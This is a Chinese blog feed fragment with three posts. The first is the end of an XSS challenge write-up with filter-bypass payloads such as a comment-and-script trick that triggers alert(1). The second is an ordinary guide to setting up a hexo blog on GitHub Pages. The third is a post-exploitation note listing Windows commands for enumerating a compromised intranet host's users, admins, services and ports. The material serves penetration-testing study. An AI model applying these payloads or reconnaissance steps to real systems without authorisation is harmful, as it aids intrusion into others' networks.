<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p>
<p>构造的<code>Payload</code>为``，此时输出为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;&#x2F;script&gt;&lt;script&gt;console.log(&quot;)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>其中<code>/script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p>
<h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--&lt;script&gt;#)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Skandia-3"><a href="#Skandia-3" class="headerlink" title="Skandia 3"></a>Skandia 3</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[\\&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><h2 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><h2 id="Well"><a href="#Well" class="headerlink" title="Well"></a>Well</h2><h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><h2 id="No"><a href="#No" class="headerlink" title="No"></a>No</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><h2 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2>]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 hexo 搭建个人博客</title>
    <url>/posts/28047.html</url>
    <content><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p>
<h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p>
<p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure>

<h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>

<p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure>

<p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p>
<p>接着执行下列命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>

<p>缩写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>

<p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p>
<p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p>
<h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p>
<p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure>

<p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p>
<h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p>
<p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p>
<p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p>
<h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>

<p>在 <code>_config.yml</code> 中配置以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure>

<p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p>
<h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>

<p>站内搜索</p>
<p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>

<p>接下来，创建一个页面来显示搜索引擎：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure>

<p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p>
<p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure>

<p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p>
<h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p>
<p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p>
<h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure>

<p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p>
<h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure>

<p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p>
<p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p>
<p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p>
<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p>
<p>然后点击页面右上角的 New SSH key 按钮：</p>
<p><img src="/posts/28047/new_ssh.png" alt></p>
<p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p>
<p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>

<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>

<p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure>

<p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/" target="_blank" rel="noopener">https://mysecroad.github.io</a> 就可以看到博客了。</p>
<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure>

<p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p>
<p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p>
<p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure>

<p>也可以不打草稿：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure>

<p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>

<p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p>
<h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p>
<h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p>接着在本地博客文件夹下依次执行下列命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p>
<p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p>
<p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p>
<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p>
<p>然后点击页面右上角的 Change default branch 按钮:</p>
<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p>
<p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p>
<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p>
<p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>

<h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure>

<p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure>

<p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息收集</title>
    <url>/posts/12754.html</url>
    <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先需要对当前所处的网络环境进行判断。判断涉及三个方面：</p>
<ul>
<li>我是谁？ —— 对当前机器角色的判断</li>
</ul>
<p>​       判断当前机器是普通的web服务器、开发测试服务器、文件服务器等。具体判断根据机器的主机名、文件、网络连接等情况综合完成。</p>
<ul>
<li><p>这是哪？ —— 对当前机器所处的网络环境的拓扑结构进行分析和判断</p>
<p>对所处的内网进行全面的数据收集和分析整理，绘制出大致的内网整体拓扑结构图。</p>
</li>
<li><p>我在哪？ —— 对当前机器所处区域的判断</p>
<p>判断机器处于网络拓扑中的哪个区域，是在DMZ、办公区还是核心区。</p>
</li>
</ul>
<h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><h3 id="手动收集信息"><a href="#手动收集信息" class="headerlink" title="手动收集信息"></a>手动收集信息</h3><p>本机信息包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。</p>
<p>通过本机的相关信息，进一步了解整个域的操作系统版本、软件及补丁安装情况、用户命名方式等。</p>
<ol>
<li><p>查询网络配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>

<img src="/posts/12754/Users\PanLv\AppData\Roaming\Typora\typora-user-images\image-20200320131051116.png" alt="ipconfig /all" style="zoom:67%;">
</li>
<li><p>查询操作系统及软件信息</p>
<p>查询操作系统和版本信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br><span class="line">中文版</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320170458113.png" alt="image-20200320170458113"></p>
<p>查看系统体系结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320170803258.png" alt="image-20200320170803258"></p>
<p>查看安装的软件及版本、路径等</p>
<p>利用<code>wmic</code>命令，将输出结果到文本文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171109489.png" alt="image-20200320171109489"></p>
<p>利用powershell命令，收集软件的版本信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="string">"Get-WmiObject -class Win32_Product |Select-Object -Property name,version"</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171356318.png" alt="image-20200320171356318"></p>
<p>查询本机服务信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171545322.png" alt="image-20200320171545322"></p>
<p>查询进程列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171800764.png" alt="当前进程"></p>
<p>查看进程信息</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320171913377.png" alt="进程信息"></p>
<p>查看启动程序信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172134213.png" alt="启动程序信息"></p>
<p>查看计划任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172338158.png" alt="计划任务"></p>
<p>查看主机开机时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172516571.png" alt="主机开机时间"></p>
<p>查询用户列表（可以找出内网机器的命令规则）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172619261.png" alt="用户列表"></p>
<p>获取本地管理员信息（通常包含域用户）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320172850280.png" alt="本地管理员"></p>
<p>查询当前在线用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173015257.png" alt="在线用户"></p>
<p>列出或断开本地计算机与所连接的客户端之间的会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>

<p>查询端口列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173231595.png" alt="端口列表"></p>
